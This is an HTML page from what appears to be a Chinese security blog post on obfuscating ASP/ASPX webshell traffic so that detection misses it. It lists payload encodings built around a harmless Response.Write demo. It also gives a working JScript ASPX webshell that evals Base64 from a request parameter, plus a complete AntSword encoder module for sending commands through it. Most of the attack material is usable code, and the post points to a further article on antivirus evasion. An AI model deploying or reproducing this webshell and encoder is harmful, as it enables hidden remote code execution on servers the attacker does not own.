@@ -1,0 +1,562 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>ASP/ASPX下的流量混淆 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="ASP/ASPX下的流量混淆" />
+<meta property="og:description" content="1 前言今天谈一谈ASP/ASPX下的流量混淆姿势。 以执行Response.Write(&quot;yzddmr6&quot;)为例。 2 不带e" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/asp-aspx-encoders/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-05-01T22:03:17+00:00" />
+<meta property="article:modified_time" content="2020-05-01T22:03:17+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="ASP/ASPX下的流量混淆"/>
+<meta name="twitter:description" content="1 前言今天谈一谈ASP/ASPX下的流量混淆姿势。 以执行Response.Write(&quot;yzddmr6&quot;)为例。 2 不带e"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/asp-aspx-encoders/" /><link rel="prev" href="https://yzddmr6.com/posts/php-preg-tricks/" /><link rel="next" href="https://yzddmr6.com/posts/tomcat-memory-webshell-filter/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "ASP/ASPX下的流量混淆",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/asp-aspx-encoders\/"
+        },"genre": "posts","wordcount":  1001 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/asp-aspx-encoders\/","datePublished": "2020-05-01T22:03:17+00:00","dateModified": "2020-05-01T22:03:17+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#不带eval的普通编码方式">不带eval的普通编码方式</a>
+      <ul>
+        <li><a href="#unicodeaspaspx">Unicode(asp/aspx)</a></li>
+        <li><a href="#大小写asp">大小写(asp)</a></li>
+        <li><a href="#添加百分号asp">添加百分号(asp)</a></li>
+      </ul>
+    </li>
+    <li><a href="#带eval的普通编码方式">带eval的普通编码方式</a>
+      <ul>
+        <li><a href="#ascii码aspaspx">ASCII码(asp/aspx)</a></li>
+        <li><a href="#字符拆分aspaspx">字符拆分(asp/aspx)</a></li>
+        <li><a href="#base64编码aspx">Base64编码(aspx)</a></li>
+        <li><a href="#url编码asp">Url编码(asp)</a></li>
+      </ul>
+    </li>
+    <li><a href="#非常规shell下的编码">非常规shell下的编码</a>
+      <ul>
+        <li><a href="#base64_bypassaspx">base64_bypass(aspx)</a></li>
+        <li><a href="#url_bypassasp">url_bypass(asp)</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ASP/ASPX下的流量混淆</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-05-01">2020-05-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2020-05-01">2020-05-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1001 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 2 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#不带eval的普通编码方式">不带eval的普通编码方式</a>
+      <ul>
+        <li><a href="#unicodeaspaspx">Unicode(asp/aspx)</a></li>
+        <li><a href="#大小写asp">大小写(asp)</a></li>
+        <li><a href="#添加百分号asp">添加百分号(asp)</a></li>
+      </ul>
+    </li>
+    <li><a href="#带eval的普通编码方式">带eval的普通编码方式</a>
+      <ul>
+        <li><a href="#ascii码aspaspx">ASCII码(asp/aspx)</a></li>
+        <li><a href="#字符拆分aspaspx">字符拆分(asp/aspx)</a></li>
+        <li><a href="#base64编码aspx">Base64编码(aspx)</a></li>
+        <li><a href="#url编码asp">Url编码(asp)</a></li>
+      </ul>
+    </li>
+    <li><a href="#非常规shell下的编码">非常规shell下的编码</a>
+      <ul>
+        <li><a href="#base64_bypassaspx">base64_bypass(aspx)</a></li>
+        <li><a href="#url_bypassasp">url_bypass(asp)</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>今天谈一谈ASP/ASPX下的流量混淆姿势。</p>
+<p>以执行<code>Response.Write(&quot;yzddmr6&quot;)</code>为例。</p>
+<h2 id="不带eval的普通编码方式" class="headerLink">
+    <a href="#%e4%b8%8d%e5%b8%a6eval%e7%9a%84%e6%99%ae%e9%80%9a%e7%bc%96%e7%a0%81%e6%96%b9%e5%bc%8f" class="header-mark"></a>2 不带eval的普通编码方式</h2><h3 id="unicodeaspaspx" class="headerLink">
+    <a href="#unicodeaspaspx" class="header-mark"></a>2.1 Unicode(asp/aspx)</h3><p>利用iis解析unicode的特性，我们可以像sql的bypass一样来用unicode编码绕过。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388250-4d5db9c7-0468-4ad2-998a-efdbf7aecbcd.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388250-4d5db9c7-0468-4ad2-998a-efdbf7aecbcd.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388250-4d5db9c7-0468-4ad2-998a-efdbf7aecbcd.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388250-4d5db9c7-0468-4ad2-998a-efdbf7aecbcd.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388250-4d5db9c7-0468-4ad2-998a-efdbf7aecbcd.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388250-4d5db9c7-0468-4ad2-998a-efdbf7aecbcd.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388349-4be2e940-6312-43b3-bc7c-e8df62d5e9f4.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388349-4be2e940-6312-43b3-bc7c-e8df62d5e9f4.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388349-4be2e940-6312-43b3-bc7c-e8df62d5e9f4.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388349-4be2e940-6312-43b3-bc7c-e8df62d5e9f4.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388349-4be2e940-6312-43b3-bc7c-e8df62d5e9f4.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388349-4be2e940-6312-43b3-bc7c-e8df62d5e9f4.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mr6=Response.Write(&#34;yzddmr6&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>蚁剑中aspx类型shell默认有unicode编码器，但是asp中没有，可以自己手动添加一份。</p>
+<h3 id="大小写asp" class="headerLink">
+    <a href="#%e5%a4%a7%e5%b0%8f%e5%86%99asp" class="header-mark"></a>2.2 大小写(asp)</h3><p>asp对于大小写不敏感，所以可以对payload中的字符进行大小写变换。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mr6=REsponSe.WriTe(&#34;yzddmr6&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388447-94bca03e-6125-4148-a08e-ec40265a9e91.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388447-94bca03e-6125-4148-a08e-ec40265a9e91.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388447-94bca03e-6125-4148-a08e-ec40265a9e91.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388447-94bca03e-6125-4148-a08e-ec40265a9e91.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388447-94bca03e-6125-4148-a08e-ec40265a9e91.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388447-94bca03e-6125-4148-a08e-ec40265a9e91.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>要注意的是aspx对大小写敏感，改变大小写之后会500。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388542-25ea48f9-09e9-4c97-ae4c-384a7ae6db46.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388542-25ea48f9-09e9-4c97-ae4c-384a7ae6db46.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388542-25ea48f9-09e9-4c97-ae4c-384a7ae6db46.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388542-25ea48f9-09e9-4c97-ae4c-384a7ae6db46.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388542-25ea48f9-09e9-4c97-ae4c-384a7ae6db46.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388542-25ea48f9-09e9-4c97-ae4c-384a7ae6db46.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="添加百分号asp" class="headerLink">
+    <a href="#%e6%b7%bb%e5%8a%a0%e7%99%be%e5%88%86%e5%8f%b7asp" class="header-mark"></a>2.3 添加百分号(asp)</h3><p>熟悉sql注入bypass的同学应该知道，iis+asp允许在每个字符前加一个<code>%</code>，此处同理。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388678-f72cfc6d-e9f3-4177-8e43-523429b79f7e.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388678-f72cfc6d-e9f3-4177-8e43-523429b79f7e.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388678-f72cfc6d-e9f3-4177-8e43-523429b79f7e.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388678-f72cfc6d-e9f3-4177-8e43-523429b79f7e.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388678-f72cfc6d-e9f3-4177-8e43-523429b79f7e.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388678-f72cfc6d-e9f3-4177-8e43-523429b79f7e.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mr6=R%e%sp%o%n%se.w%ri%te(&#34;yzddmr6&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="带eval的普通编码方式" class="headerLink">
+    <a href="#%e5%b8%a6eval%e7%9a%84%e6%99%ae%e9%80%9a%e7%bc%96%e7%a0%81%e6%96%b9%e5%bc%8f" class="header-mark"></a>3 带eval的普通编码方式</h2><p>有eval的情况下，无非是找找字符串变换函数来回套娃。</p>
+<h3 id="ascii码aspaspx" class="headerLink">
+    <a href="#ascii%e7%a0%81aspaspx" class="header-mark"></a>3.1 ASCII码(asp/aspx)</h3><p>asp下用chr函数+&amp;连接</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388782-49c3c284-4838-4ecb-8e37-7e98cf1f1399.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388782-49c3c284-4838-4ecb-8e37-7e98cf1f1399.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388782-49c3c284-4838-4ecb-8e37-7e98cf1f1399.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388782-49c3c284-4838-4ecb-8e37-7e98cf1f1399.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388782-49c3c284-4838-4ecb-8e37-7e98cf1f1399.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388782-49c3c284-4838-4ecb-8e37-7e98cf1f1399.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mr6=eval(chr(82)%26chr(101)%26chr(115)%26chr(112)%26chr(111)%26chr(110)%26chr(115)%26chr(101)%26chr(46)%26chr(87)%26chr(114)%26chr(105)%26chr(116)%26chr(101)%26chr(40)%26chr(34)%26chr(121)%26chr(122)%26chr(100)%26chr(100)%26chr(109)%26chr(114)%26chr(54)%26chr(34)%26chr(41))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388885-7df9dee3-79c8-422e-93da-bd79cd266c0c.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388885-7df9dee3-79c8-422e-93da-bd79cd266c0c.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388885-7df9dee3-79c8-422e-93da-bd79cd266c0c.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388885-7df9dee3-79c8-422e-93da-bd79cd266c0c.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388885-7df9dee3-79c8-422e-93da-bd79cd266c0c.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388885-7df9dee3-79c8-422e-93da-bd79cd266c0c.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>aspx下用String.fromCharCode+逗号连接</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mr6=eval(String.fromCharCode(82,101,115,112,111,110,115,101,46,87,114,105,116,101,40,34,121,122,100,100,109,114,54,34,41),&#34;unsafe&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="字符拆分aspaspx" class="headerLink">
+    <a href="#%e5%ad%97%e7%ac%a6%e6%8b%86%e5%88%86aspaspx" class="header-mark"></a>3.2 字符拆分(asp/aspx)</h3><p>asp下用<code>&amp;</code>连接字符串，demo同<code>chr函数</code>。</p>
+<p>aspx用<code>+</code>或者<code>concat</code>函数连接字符串</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mr6=eval(&#39;Respons&#39;%2B&#39;e.Write(&#34;yzddmr6&#34;)&#39;,&#34;unsafe&#34;)
+</span></span><span class="line"><span class="cl">mr6=eval(&#39;Respons&#39;.concat(&#39;e.Write(&#34;yzddmr6&#34;)&#39;),&#34;unsafe&#34;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="base64编码aspx" class="headerLink">
+    <a href="#base64%e7%bc%96%e7%a0%81aspx" class="header-mark"></a>3.3 Base64编码(aspx)</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mr6=eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(&#34;UmVzcG9uc2UuV3JpdGUoInl6ZGRtcjYiKTs=&#34;)),&#34;unsafe&#34;);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="url编码asp" class="headerLink">
+    <a href="#url%e7%bc%96%e7%a0%81asp" class="header-mark"></a>3.4 Url编码(asp)</h3><p>asp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eval(unescape(&#34;%25%35%32%25%36%35%25%37%33%25%37%30%25%36%66%25%36%65%25%37%33%25%36%35%25%32%65%25%35%37%25%37%32%25%36%39%25%37%34%25%36%35%25%32%38%25%32%32%25%37%39%25%37%61%25%36%34%25%36%34%25%36%64%25%37%32%25%33%36%25%32%32%25%32%39&#34;))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="非常规shell下的编码" class="headerLink">
+    <a href="#%e9%9d%9e%e5%b8%b8%e8%a7%84shell%e4%b8%8b%e7%9a%84%e7%bc%96%e7%a0%81" class="header-mark"></a>4 非常规shell下的编码</h2><p>以上都是针对于基础类型的shell的流量混淆方法，如果不在最外层再套娃一次的话还是很容易被识别，这里给出几个demo。</p>
+<h3 id="base64_bypassaspx" class="headerLink">
+    <a href="#base64_bypassaspx" class="header-mark"></a>4.1 base64_bypass(aspx)</h3><p>shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ Page Language=&#34;Jscript&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[&#34;mr6&#34;])),&#34;unsafe&#34;);%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以按照https://yzddmr6.tk/posts/webshell-venom-aspx/ 这篇文章做一下免杀</p>
+<p>base64_bypass编码器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//
+</span></span><span class="line"><span class="cl">// aspx::base64_bypass 编码模块
+</span></span><span class="line"><span class="cl">// 把所有参数都进行base64编码
+</span></span><span class="line"><span class="cl">// author：yzddmr6
+</span></span><span class="line"><span class="cl">&#39;use strict&#39;;
+</span></span><span class="line"><span class="cl">module.exports = (pwd, data, ext = null) =&gt; {
+</span></span><span class="line"><span class="cl">  let randomID;
+</span></span><span class="line"><span class="cl">  if (ext.opts.otherConf[&#39;use-random-variable&#39;] === 1) {
+</span></span><span class="line"><span class="cl">    randomID = antSword.utils.RandomChoice(antSword[&#39;RANDOMWORDS&#39;]);
+</span></span><span class="line"><span class="cl">  } else {
+</span></span><span class="line"><span class="cl">    randomID = `${antSword[&#39;utils&#39;].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  data[randomID] = Buffer
+</span></span><span class="line"><span class="cl">    .from(data[&#39;_&#39;])
+</span></span><span class="line"><span class="cl">    .toString(&#39;base64&#39;);
+</span></span><span class="line"><span class="cl">  data[pwd] = Buffer.from(`eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item[&#34;${randomID}&#34;])),&#34;unsafe&#34;);`).toString(&#39;base64&#39;);
+</span></span><span class="line"><span class="cl">  delete data[&#39;_&#39;];
+</span></span><span class="line"><span class="cl">  return data;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388987-30c329f6-778e-42b8-9119-3d93d9942d96.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388987-30c329f6-778e-42b8-9119-3d93d9942d96.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388987-30c329f6-778e-42b8-9119-3d93d9942d96.png"
